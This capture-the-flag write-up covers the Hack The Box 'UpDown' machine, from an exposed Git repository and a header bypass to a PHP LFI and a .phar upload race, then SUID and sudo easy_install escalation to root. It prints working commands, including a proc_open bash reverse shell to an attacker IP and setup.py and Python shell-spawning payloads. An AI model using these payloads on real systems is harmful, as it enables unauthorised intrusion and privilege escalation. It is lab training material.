# Hack The Box: UpDown — Detailed Attack Chain

## Attack Chain Overview

The target exposed SSH and an Apache web application named **Is My Website
Up?**. Web enumeration revealed a development directory and an exposed Git
repository. The recovered Git history disclosed a static HTTP header used to
protect the development virtual host, as well as the PHP source code for a
website-checking and file-upload feature.

The development application contained several weaknesses that formed a single
initial-access chain:

1. A local file inclusion sink accepted PHP stream wrappers.
2. The upload filter used a denylist that did not block the `.phar` extension.
3. Uploaded files were placed under a directory derived from `md5(time())`,
   making the location predictable.
4. The file was deleted after processing, but an attacker-controlled slow HTTP
   request extended the period during which it remained accessible.
5. Apache treated the uploaded `.phar` as PHP.
6. Common command-execution functions were disabled, but `proc_open()` was
   still available and provided command execution as `www-data`.

Local enumeration then identified a nonstandard set-user-ID executable at
`/home/developer/dev/siteisup`. It was owned by `developer`, executable by the
`www-data` group, and evaluated supplied input as Python. A Python expression
replaced the process with a privilege-preserving Bash shell, producing a shell
as `developer`.

Finally, `developer` was allowed to execute `/usr/local/bin/easy_install` as
root without a password. `easy_install` executed attacker-controlled Python
from a temporary `setup.py`, resulting in a root shell.

The complete path was:

```text
TCP/80
  -> /dev/.git disclosure
  -> static Special-Dev header recovered
  -> development application access
  -> PHP filter source disclosure
  -> .phar upload + predictable path + deletion race
  -> proc_open() reverse shell as www-data
  -> custom SUID Python application
  -> shell as developer
  -> permitted easy_install execution of setup.py
  -> root
```

## Assessment Information

| Item | Value |
|---|---|
| Machine | UpDown |
| Target IP | `10.129.227.227` |
| Primary hostname | `siteisup.htb` |
| Development hostname | `dev.siteisup.htb` |
| Attacker VPN IP | `10.10.15.156` |
| Operating system | Ubuntu Linux |
| Web server | Apache HTTP Server 2.4.41 |
| Initial shell | `www-data` |
| Intermediate user | `developer` (`uid=1002`) |
| Final access | `root` (`uid=0`) |
| Assessment date | 2026-10-23 |
| Scope | Authorized Hack The Box lab |

---

# 1. Reconnaissance

## 1.1 Local Name Resolution

Both relevant names resolve to the target:

```bash
printf '%s\n' '10.129.227.227 siteisup.htb dev.siteisup.htb' >> /etc/hosts
getent hosts siteisup.htb dev.siteisup.htb
```

```text
10.129.227.227 siteisup.htb dev.siteisup.htb
10.129.227.227 siteisup.htb dev.siteisup.htb
```

The hostname matters because Apache uses name-based routing and the development
application is exposed through `dev.siteisup.htb`.

## 1.2 Full TCP Discovery

A full TCP scan was run without host discovery because HTB targets commonly
ignore ICMP probes:

```bash
nmap -p- --min-rate 5000 -Pn 10.129.227.227 -oN scans/tcp-full.txt
```

Captured result:

```text
Nmap scan report for siteisup.htb (10.129.227.227)
Host is up (0.10s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
20035/tcp filtered unknown
23196/tcp filtered unknown
37822/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 21.99 seconds
```

The scan also reported three filtered high ports. They did not present a usable
service and were not part of the successful path.

## 1.3 Service and Version Detection

```bash
nmap -sC -sV -Pn -p 22,80 10.129.227.227 -oN scans/tcp-services.txt
```

```text
Nmap scan report for siteisup.htb (10.129.227.227)
Host is up (0.097s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)
|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)
|_  256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Is my Website up ?
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The HTTP service returned the title `Is my Website up ?`. No credentials were
available for SSH, so the web application was the logical initial focus.

## 1.4 Web Fingerprinting

```bash
whatweb http://siteisup.htb
curl -i http://siteisup.htb/
```

Representative fingerprint output:

```text
http://siteisup.htb [200 OK]
Apache[2.4.41]
HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)]
IP[10.129.227.227]
Title[Is my Website up ?]
X-UA-Compatible[chrome=1]
```

The application returned HTTP 200 and identified Apache 2.4.41 on Ubuntu. The
page itself was a simple website-availability checker.

## 1.5 Content Discovery

The saved enumeration used multiple tools. Representative commands were:

```bash
gobuster dir -u http://siteisup.htb/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt

feroxbuster -u http://siteisup.htb/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
  -x php,html,txt,js,bak,old,zip

ffuf -ac \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://10.129.227.227/ \
  -H 'Host: FUZZ.siteisup.htb'
```

The important captured discoveries were:

```text
301 GET  http://siteisup.htb/dev       -> http://siteisup.htb/dev/
200 GET  http://siteisup.htb/dev/
200 GET  http://siteisup.htb/dev/index.php
301 GET  http://siteisup.htb/dev/.git  -> http://siteisup.htb/dev/.git/
200 GET  http://siteisup.htb/dev/.git/index        762 bytes
200 GET  http://siteisup.htb/dev/.git/description   73 bytes
200 GET  http://siteisup.htb/dev/.git/config        298 bytes
200 GET  http://siteisup.htb/dev/.git/packed-refs   112 bytes
200 GET  http://siteisup.htb/dev/.git/HEAD           21 bytes

403      dev.siteisup.htb                           281 bytes
```

The accessible `.git` metadata was substantially more important than the 403
response. A 403 only established that access control existed; the repository
revealed how that control worked.

---

# 2. Exposed Git Repository

## 2.1 Repository Recovery

The development repository was recovered from the exposed Git object store:

```bash
git-dumper http://siteisup.htb/dev/.git/ dev-repo
cd dev-repo
git status
git log --oneline --all
```

The history contained commits for `.htaccess`, `index.php`, `checker.php`,
`admin.php`, `changelog.txt`, and the uploads directory. Captured output:

```text
010dcc3 Delete index.php
c8fcc40 Update checker.php
f67efd0 Create checker.php
ab9bc16 Update changelog.txt
60d2b32 Create admin.php
c1998f8 Add admin panel.
35a3801 Update changelog.txt
57af03b Create index.php
354fe06 Delete .htpasswd
8812785 New technique in header to protect our dev vhost.
bc4ba79 Update .htaccess
61e5cc0 Update index.php
3d66cd4 Create changelog.txt
4fb1927 Create stylesheet.css
6f89af7 Create index.php
8d1beb1 Create .htpasswd
6ddcc7a Create .htaccess
```

This is a strong example of why recovering Git history is more useful than
only viewing the current tree: removed credentials, retired controls, and the
reason for security-sensitive changes often remain in earlier commits.

## 2.2 Development Header Disclosure

The current `.htaccess` contained:

```apache
SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header
```

Therefore the development site was not protected by authentication. It trusted
a static, client-controlled HTTP header:

```http
Special-Dev: only4dev
```

The control was bypassed with:

```bash
curl -i -H 'Special-Dev: only4dev' http://dev.siteisup.htb/
```

The response exposed the developer page, an Admin Panel link, and the beta
website-list upload form:

```html
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8

<b>This is only for developers</b>
<br>
<a href="?page=admin">Admin Panel</a>
...
<form method="post" enctype="multipart/form-data">
  <label>List of websites to check:</label><br><br>
  <input type="file" name="file" size="50">
  <input name="check" type="submit" value="Check">
</form>
```

## 2.3 Security Impact

A secret header is not an authentication mechanism when the secret is stored
in a web-accessible repository. Once disclosed, every protected endpoint is
available to an unauthenticated client. The header must be included in later
requests to the development application and its uploaded-file paths.

---

# 3. PHP Local File Inclusion and Source Disclosure

## 3.1 Vulnerable Include Logic

Recovered `index.php` contained:

```php
define("DIRECTACCESS", false);
$page = $_GET['page'];

if ($page && !preg_match("/bin|usr|home|var|etc/i", $page)) {
    include($_GET['page'] . ".php");
} else {
    include("checker.php");
}
```

The application directly concatenated user input into an `include()` call.
The blacklist only rejected a few directory-name fragments. It did not enforce
an allowlist of valid page names and did not reject PHP stream wrappers.

## 3.2 PHP Filter Technique

The `php://filter` wrapper can base64-encode a PHP file before the PHP engine
executes it. Because the application appends `.php`, the resource value was
given as `checker`, producing an effective resource of `checker.php`:

```bash
curl -H 'Special-Dev: only4dev' -G \
  --data-urlencode 'page=php://filter/convert.base64-encode/resource=checker' \
  http://dev.siteisup.htb/
```

The response included a long base64 blob beginning with `PD9waHA`, the base64
representation of `<?php`. It was decoded for source review:

```text
<b>This is only for developers</b>
<br>
<a href="?page=admin">Admin Panel</a>
PD9waHAKaWYoRElSRUNUQUNDRVNTKXsKCWRpZSgiQWNjZXNzIERlbmllZCIpOwp9Cj8+Cjwh...
```

```bash
curl -sS -H 'Special-Dev: only4dev' -G \
  --data-urlencode 'page=php://filter/convert.base64-encode/resource=checker' \
  http://dev.siteisup.htb/ \
  | grep -oE '[A-Za-z0-9+/=]{100,}' \
  | base64 -d > checker-from-filter.php
```

The source matched the repository copy and confirmed that the deployed
application retained the vulnerable upload logic.

## 3.3 Root Cause

The root problem was dynamic file inclusion from a query parameter. The
blacklist was incomplete by design: it tried to describe malicious strings
instead of defining the small set of legitimate pages. A safe design would map
fixed identifiers such as `admin` to fixed server-side paths.

---

# 4. Upload Feature Analysis

The relevant logic in `checker.php` performed the following actions:

```php
if ($_FILES['file']['size'] > 10000) {
    die("File too large!");
}

$file = $_FILES['file']['name'];
$ext = getExtension($file);

if (preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i", $ext)) {
    die("Extension not allowed!");
}

$dir = "uploads/" . md5(time()) . "/";
mkdir($dir, 0770, true);
$final_path = $dir . $file;
move_uploaded_file($_FILES['file']['tmp_name'], $final_path);

$websites = explode("\n", file_get_contents($final_path));

foreach ($websites as $site) {
    $check = isitup(trim($site));
}

@unlink($final_path);
```

`isitup()` passed each line to cURL, followed redirects, disabled TLS
verification, and waited up to 30 seconds:

```php
curl_setopt($ch, CURLOPT_URL, trim($url));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
```

## 4.1 Combined Weaknesses

| Weakness | Practical consequence |
|---|---|
| Extension denylist | `.phar` was not rejected. |
| Original filename retained | The attacker controlled the executable extension. |
| Uploads stored under the web root | Uploaded content could be requested through Apache. |
| `md5(time())` directory name | A small range of server timestamps predicted the directory. |
| File processed before deletion | A time-of-check/time-of-use window existed. |
| Attacker-controlled outbound URL | A slow HTTP response kept processing blocked for up to 30 seconds. |
| PHP execution for `.phar` | Requesting the temporary file executed embedded PHP. |
| Incomplete function restrictions | `proc_open()` remained available for command execution. |

No single control prevented exploitation. The attack succeeded because the
controls were layered incorrectly: a bypassable extension list, a predictable
path, web-accessible storage, and delayed deletion all protected the same
dangerous operation.

---

# 5. Initial Access as `www-data`

## 5.1 Proof-of-Execution Payload

The uploaded `.phar` began with a URL controlled by the attacker. The target's
cURL client connected to that URL and waited for a response, preserving the
uploaded file long enough to request it separately. The remainder was valid PHP
executed when Apache served the `.phar`:

```bash
cat > proof.phar <<'PHAR'
http://10.10.15.156:8000/hold
<?php echo "UPDOWN_PHP_OK\nDISABLED=".ini_get("disable_functions")."\n"; ?>
PHAR
```

On the attacker machine, a listener accepted the application's HTTP request
without immediately returning a valid HTTP response:

```bash
nc -lvnp 8000 > slow-request.txt
```

The saved request confirmed server-side cURL execution:

```http
GET /hold HTTP/1.1
Host: 10.10.15.156:8000
User-Agent: siteisup.htb beta
Accept: */*
```

## 5.2 Upload Request

In another terminal, the upload was initiated with the required development
header. Running it in the background allowed the candidate upload path to be
requested while the application remained blocked on the slow URL:

```bash
curl -sS -H 'Special-Dev: only4dev' \
  -F 'check=Check' \
  -F 'file=@proof.phar;filename=proof.phar' \
  http://dev.siteisup.htb/ \
  > upload-response.html &
```

## 5.3 Predicting the Upload Directory

The directory name was `md5(time())`, where `time()` was the target's Unix
timestamp at upload. The HTTP `Date` header supplied the server time, and a
small offset window accounted for latency and second-boundary changes:

```bash
SERVER_DATE=$(curl -sSI -H 'Special-Dev: only4dev' \
  http://dev.siteisup.htb/ | awk -F': ' 'tolower($1)=="date" {print $2}' | tr -d '\r')
SERVER_EPOCH=$(date -d "$SERVER_DATE" +%s)
echo "$SERVER_EPOCH"

for TS in $(seq "$((SERVER_EPOCH - 3))" "$((SERVER_EPOCH + 3))"); do
  HASH=$(printf '%s' "$TS" | md5sum | awk '{print $1}')
  printf '%s %s\n' "$TS" "$HASH"
done
```

While the upload request remained blocked, each candidate path was probed. For
the proof payload, a positive response contained `UPDOWN_PHP_OK`:

```bash
for TS in $(seq "$((SERVER_EPOCH - 3))" "$((SERVER_EPOCH + 3))"); do
  HASH=$(printf '%s' "$TS" | md5sum | awk '{print $1}')
  URL="http://dev.siteisup.htb/uploads/$HASH/proof.phar"
  BODY=$(curl -sS --max-time 2 -H 'Special-Dev: only4dev' "$URL" 2>/dev/null || true)

  if grep -q 'UPDOWN_PHP_OK' <<< "$BODY"; then
    printf '[+] Found: %s\n' "$URL"
    printf '%s\n' "$BODY"
    break
  fi
done
```

During the successful attempt, the observed values were:

```text
Server epoch: 1792756246
Successful candidate timestamp: 1792756248 (+2 seconds)
Directory: b7f8b606f62d1580a1ebba32e9f2d909
```

The file was found at:

```text
http://dev.siteisup.htb/uploads/b7f8b606f62d1580a1ebba32e9f2d909/proof.phar
```

Requesting it while the upload handler was still waiting produced:

```text
UPDOWN_PHP_OK
DISABLED=pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,
pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,
pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,
pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,
pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,
pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,
pcntl_unshare,error_log,system,exec,shell_exec,popen,passthru,link,
symlink,syslog,ld,mail,stream_socket_sendto,dl,stream_socket_client,
fsockopen
```

This confirmed both PHP execution and the available execution primitives.

## 5.4 Reverse-Shell Payload

Although `system`, `exec`, `shell_exec`, `popen`, and `passthru` were disabled,
`proc_open()` was available. The working `shell.phar` was created with:

```bash
cat > shell.phar <<'PHAR'
http://10.10.15.156:8000/hold
<?php proc_open("bash -c 'bash -i >& /dev/tcp/10.10.15.156/4444 0>&1'", array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w')), $pipes); ?>
PHAR
```

The reverse-shell listener was started on the attacker machine:

```bash
nc -lvnp 4444
```

The same upload-and-race process was repeated using `shell.phar`:

```bash
curl -sS -H 'Special-Dev: only4dev' \
  -F 'check=Check' \
  -F 'file=@shell.phar;filename=shell.phar' \
  http://dev.siteisup.htb/ \
  > upload-response-shell.html &

for TS in $(seq "$((SERVER_EPOCH - 3))" "$((SERVER_EPOCH + 3))"); do
  HASH=$(printf '%s' "$TS" | md5sum | awk '{print $1}')
  URL="http://dev.siteisup.htb/uploads/$HASH/shell.phar"
  curl -sS --max-time 3 -H 'Special-Dev: only4dev' "$URL" >/dev/null 2>&1 || true
done
```

Requesting the correct temporary URL executed `proc_open()` and returned a
shell as the web server account:

```bash
whoami
id
hostname
```

```text
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
updown
```

## 5.5 Why the Race Was Necessary

The application deleted the uploaded file after checking all listed websites.
Without delaying `isitup()`, the file often disappeared before a second request
could reach it. The first line's slow HTTP URL converted a very small race into
an approximately 30-second window, matching the cURL timeout in source.

---

# 6. Local Enumeration

The reusable post-foothold collector was transferred from the attacker host and
run in deep mode:

Attacker terminal:

```bash
cd /home/zendeni/tools/post-linux-foothold
python3 -m http.server 8000
```

Target shell:

```bash
curl -fsS http://10.10.15.156:8000/post-linux-foothold.sh \
  -o /tmp/post-linux-foothold.sh
chmod +x /tmp/post-linux-foothold.sh
/tmp/post-linux-foothold.sh --deep -o /tmp/updown-enum-v3
sed -n '1,260p' /tmp/updown-enum-v3/summary.md
```

All 19 sections completed. The ranked result correctly selected one anomalous
set-user-ID executable as the best lead:

```text
## Recommended Next Steps

Best initial lead: Nonstandard privileged executable: /home/developer/dev/siteisup

1. HIGH — Nonstandard privileged executable: /home/developer/dev/siteisup
   Evidence: 13-suid-sgid-capabilities.txt; 18-custom-code.txt
   Proceed: Inspect its ownership, file type and notable strings in the
   custom-code report, then trace how it handles user-controlled input.
```

The relevant mode and ownership were:

```text
-rwsr-x--- developer:www-data /home/developer/dev/siteisup
```

Every collection section, including the deep filesystem search, completed:

```text
Identity and session                 complete  01-identity.txt
OS and kernel                        complete  02-os-kernel.txt
Users and groups                     complete  03-users-groups.txt
Environment and PATH                 complete  04-environment-path.txt
Filesystems                          complete  05-filesystems.txt
Processes                            complete  06-processes.txt
Network                              complete  07-network.txt
Services                             complete  08-services.txt
Scheduled jobs                       complete  09-schedules.txt
Security controls                    complete  10-security-controls.txt
Packages and tools                   complete  11-packages-tools.txt
Sessions and logs                    complete  12-sessions-logs.txt
SUID, SGID and capabilities          complete  13-suid-sgid-capabilities.txt
Writable surfaces                    complete  14-writable-surfaces.txt
Applications and configs             complete  15-apps-configs.txt
Credentials and artifacts            complete  16-credentials-artifacts.txt
Containers                           complete  17-containers.txt
Custom code                          complete  18-custom-code.txt
Deep filesystem search               complete  19-deep-search.txt
```

Interpretation:

- The owner was `developer`.
- The group was `www-data`.
- Group members could read and execute the file.
- The owner's execute position contained `s`, so set-user-ID was enabled.
- A process launched by `www-data` therefore executed with `developer` as its
  effective user.

The normal operating-system SUID/SGID entries were lower priority because they
were standard platform binaries. A custom privileged executable under a user's
home directory was a much stronger anomaly.

---

# 7. Privilege Escalation: `www-data` to `developer`

## 7.1 Running the Custom Application

```bash
/home/developer/dev/siteisup
```

The complete privilege transition was:

```text
www-data@updown:/tmp$ /home/developer/dev/siteisup
Welcome to 'siteisup.htb' application

Enter URL here:__import__('os').execl('/bin/bash','bash','-p')
developer@updown:/tmp$ id
uid=1002(developer) gid=33(www-data) groups=33(www-data)
developer@updown:/tmp$ whoami
developer
developer@updown:/tmp$ cd /home/developer
developer@updown:/home/developer$ ls -la
total 40
drwxr-xr-x 6 developer developer 4096 Aug 30  2022 .
drwxr-xr-x 3 root      root      4096 Jun 22  2022 ..
lrwxrwxrwx 1 root      root         9 Jul 27  2022 .bash_history -> /dev/null
-rw-r--r-- 1 developer developer  231 Jun 22  2022 .bash_logout
-rw-r--r-- 1 developer developer 3771 Feb 25  2020 .bashrc
drwx------ 2 developer developer 4096 Aug 30  2022 .cache
drwxrwxr-x 3 developer developer 4096 Aug  1  2022 .local
-rw-r--r-- 1 developer developer  807 Feb 25  2020 .profile
drwx------ 2 developer developer 4096 Aug  2  2022 .ssh
drwxr-x--- 2 developer www-data  4096 Jun 22  2022 dev
-rw-r----- 1 root      developer   33 Oct 23 10:02 user.txt
```

The input was evaluated as a Python expression. This behavior is consistent
with Python 2's unsafe `input()` semantics, which evaluate input instead of
returning it as a string. Importing `os` from within the prompt and calling
`execl()` demonstrated arbitrary Python execution.

## 7.2 Spawning a Privilege-Preserving Shell

The following expression was entered directly at the URL prompt:

```python
__import__('os').execl('/bin/bash','bash','-p')
```

`os.execl()` replaced the vulnerable process with Bash. The `-p` option told
Bash to preserve the effective identity inherited from the set-user-ID
executable.

Verification:

```bash
id
whoami
cd /home/developer
ls -la
```

```text
uid=1002(developer) gid=33(www-data) groups=33(www-data)
developer
```

The user proof was readable because `user.txt` belonged to `root:developer`
with group-read permission:

```bash
cat /home/developer/user.txt
```

```text
[REDACTED USER FLAG]
```

## 7.3 Root Cause

The program combined two unsafe properties:

1. It accepted untrusted input in a context that evaluated Python expressions.
2. It carried the set-user-ID bit and was owned by a more privileged user.

An ordinary code-evaluation bug would have remained within the caller's
security context. The set-user-ID configuration turned it into a direct local
privilege boundary bypass.

---

# 8. Privilege Escalation: `developer` to `root`

## 8.1 Enumerating the Configured Rule

The developer account was permitted to run one package-management helper as
root without a password:

```bash
sudo -l
```

```text
Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install
```

The rule was dangerous because `easy_install` processes Python packaging files,
including attacker-controlled `setup.py` code.

## 8.2 Payload Preparation and Direct-Execution Failure

A temporary directory was created with a `setup.py` whose top-level code
replaced the package process with a privilege-preserving Bash shell:

```bash
TF=$(mktemp -d)
printf '%s\n' \
  "import os; os.execl('/bin/bash', 'bash', '-p')" \
  > "$TF/setup.py"
```

Running the binary directly did **not** cross the privilege boundary:

```bash
/usr/local/bin/easy_install "$TF"
```

It failed while testing write access to the system package directory:

```text
error: can't create or remove files in install directory

The following error occurred while trying to add or remove files in the
installation directory:

    [Errno 13] Permission denied:
    '/usr/local/lib/python2.7/dist-packages/test-easy-install-7336.write-test'

The installation directory you specified was:

    /usr/local/lib/python2.7/dist-packages/

Perhaps your account does not have write access to this directory?
```

This failure was expected in hindsight: direct execution still ran as
`developer`. The policy rule only applies when explicitly invoked through the
configured privilege mechanism.

## 8.3 Applying the Configured Rule

The same package directory was then supplied through the permitted command,
causing `easy_install` and its `setup.py` processing to run as root:

```bash
sudo /usr/local/bin/easy_install "$TF"
```

Observed output before the shell opened:

```text
WARNING: The easy_install command is deprecated and will be removed in a future version.
Processing tmp.X8HWd6hNw0
Writing /tmp/tmp.X8HWd6hNw0/setup.cfg
Running setup.py -q bdist_egg --dist-dir /tmp/tmp.X8HWd6hNw0/egg-dist-tmp-IR8mL1
```

The phrase `Running setup.py` is the critical transition. Because
`easy_install` was running as root, the imported top-level Python executed as
root. `os.execl()` then replaced that process with Bash.

Verification:

```bash
id
whoami
```

```text
uid=0(root) gid=0(root) groups=0(root)
root
```

Both proof files were then collected from the root shell:

```bash
cat /home/developer/user.txt
cat /root/root.txt
```

```text
[REDACTED USER FLAG]
[REDACTED ROOT FLAG]
```

## 8.4 Root Cause

`easy_install` is not a narrowly scoped administrative action. It is an
interpreter-adjacent package tool that deliberately executes Python packaging
code. Allowing an unprivileged user to run it as root is equivalent to allowing
that user to run arbitrary Python as root.

---

# 9. Complete Reproduction Summary

The concise chain, excluding repeated enumeration, was:

```bash
# Recover the exposed application repository.
git-dumper http://siteisup.htb/dev/.git/ dev-repo

# Apply the disclosed development header and confirm access.
curl -H 'Special-Dev: only4dev' http://dev.siteisup.htb/

# Confirm source disclosure through PHP filters.
curl -H 'Special-Dev: only4dev' -G \
  --data-urlencode 'page=php://filter/convert.base64-encode/resource=checker' \
  http://dev.siteisup.htb/

# After the .phar upload race, verify the foothold.
whoami
id

# Abuse the custom SUID application.
/home/developer/dev/siteisup
```

At the application's prompt:

```python
__import__('os').execl('/bin/bash','bash','-p')
```

Then:

```bash
# Confirm developer access and prepare setup.py.
id
TF=$(mktemp -d)
printf '%s\n' \
  "import os; os.execl('/bin/bash', 'bash', '-p')" \
  > "$TF/setup.py"

# Apply the exact permitted rule.
sudo /usr/local/bin/easy_install "$TF"

# Confirm root and collect the two proof files.
id
cat /home/developer/user.txt
cat /root/root.txt
```

---

## Final Captured Output

The final terminal state confirms both privilege transitions and both proof
files:

```text
developer@updown:/home/developer$ sudo /usr/local/bin/easy_install "$TF"
WARNING: The easy_install command is deprecated and will be removed in a future version.
Processing tmp.X8HWd6hNw0
Writing /tmp/tmp.X8HWd6hNw0/setup.cfg
Running setup.py -q bdist_egg --dist-dir /tmp/tmp.X8HWd6hNw0/egg-dist-tmp-IR8mL1
root@updown:/tmp/tmp.X8HWd6hNw0# id
uid=0(root) gid=0(root) groups=0(root)
root@updown:/tmp/tmp.X8HWd6hNw0# cat /home/developer/user.txt
[REDACTED USER FLAG]
root@updown:/tmp/tmp.X8HWd6hNw0# cat /root/root.txt
[REDACTED ROOT FLAG]
```

At this point the attack chain was complete: the exposed web repository led to
the protected development application, the application flaws produced a shell
as `www-data`, the custom SUID application crossed into `developer`, and the
permitted Python package tool executed the final shell as `root`.
